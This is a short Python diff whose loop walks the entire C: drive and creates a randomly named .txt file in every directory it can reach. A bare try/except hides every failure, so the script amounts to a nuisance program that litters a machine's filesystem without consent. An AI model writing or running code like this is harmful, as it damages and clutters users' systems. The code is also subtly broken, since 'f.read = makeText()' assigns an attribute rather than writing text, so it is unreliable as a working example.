@@ -27,7 +27,16 @@ def makeText():
 
 
 for (path, dir,file) in os.walk('C:/'):
-    filename = path + "\\"+ makeName()+"."+makeName()
-    f = open(filename,'r')
-    f.read = makeText()
-    f.close()
+    try:
+        if(path == 'C:/'):
+            filename = path + ""+ makeName()+".txt"
+            f = open(filename,'w')
+            f.read = makeText()
+            f.close()
+        else:
+            filename = path + "\\"+ makeName()+".txt"
+            f = open(filename,'w')
+            f.read = makeText()
+            f.close()
+    except:
+        pass
